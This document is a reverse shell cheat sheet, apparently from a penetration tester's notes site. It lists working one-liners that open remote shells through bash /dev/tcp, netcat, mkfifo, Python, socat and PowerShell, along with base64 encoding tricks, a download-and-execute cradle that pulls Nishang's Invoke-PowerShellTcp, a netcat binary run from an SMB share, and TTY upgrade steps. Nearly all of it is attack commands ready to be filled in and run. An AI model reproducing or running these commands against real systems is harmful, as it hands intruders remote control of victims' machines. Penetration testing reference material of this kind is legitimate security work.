# Reverse Shells

## Reverse Shells

### Reverse Shell Generator

[https://www.revshells.com/](https://www.revshells.com/)

### Bash

```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

{% hint style="info" %}
It is recommended to encapsulate the command in a `bash -c ''` to prevent issues with the _**/dev/tcp**_ bash functionality.
{% endhint %}

We can encode the content in **base64**, to avoid conflicts with symbols and spaces in URLs. Additionally, to prevent any _"+"_ characters from appearing, we can use double encoding.

```bash
# Get the encoded command
echo "bash -i >& /dev/tcp/<ip>/<port> 0>&1" | base64 | base64

# Execute the reverse shell
echo <b64_code> | base64 -d | base64 -d | bash
```

### Netcat

```bash
nc -e /bin/bash <ip> <port>
```

### Mkfifo

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```

### Python3

```bash
i="<ip>" p=<port> && echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$i',$p));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')" | python3
```

### Socat

```bash
socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

### PowerShell&#x20;

#### Base64

```bash
# Get the encoded command
echo '$client = New-Object System.Net.Sockets.TCPClient("<ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le |base64 -w 0; echo

# Execute the reverse shell
powershell -e <b64_code>
```

#### Nishang

Run this on your local machine:

{% code overflow="wrap" %}
```bash
i="<ip>" p=<port> && curl -sL https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -o rs.ps1 && echo "Invoke-PowerShellTcp -Reverse -IPAddress $i -Port $p" >> rs.ps1 && python3 -m http.server 80
```
{% endcode %}

And while running the python http server, execute this on the target:

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://<ip>/rs.ps1')" 
```

#### Netcat

Locate "nc.exe" and copy it to your current directory, then run this on your local machine:

```bash
smbserver.py <share_name> $(pwd) -smb2support
```

And while running the smb server, execute this on the target:

```html
\\<ip>\smbShare\nc.exe -e cmd <ip> <port>
```

## Interactive TTY

{% hint style="info" %}
It is also possible to use `rlwrap` when starting your listening socket:

```bash
rlwrap -cAr nc -nlvp <port>
```
{% endhint %}

```bash
script /dev/null -c bash
```

or

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

and then

```bash
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows <rows> columns <cols>  # Check size in another window -> stty size
```
